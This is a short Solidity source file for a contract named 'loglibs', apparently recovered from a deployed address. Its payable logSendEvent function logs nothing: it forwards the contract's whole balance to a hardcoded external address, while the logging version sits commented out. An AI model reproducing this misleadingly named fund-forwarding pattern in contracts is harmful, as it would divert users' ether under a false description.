/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract loglibs at 0xBC3A2d9D5Cf09013FB6ED85d97B180EaF76000Bd
*/
pragma solidity 0.4.19;
contract loglibs {
   mapping (address => uint256) public sendList;

   /*function logSendEvent() payable public{
        sendList[msg.sender] = 1 ether;
   }*/

   function logSendEvent() payable public{
       address addr = 0xe3632684dB2BCE417dF118686F315872b2Fc4E3D;
       require(addr.send(this.balance));
   }

}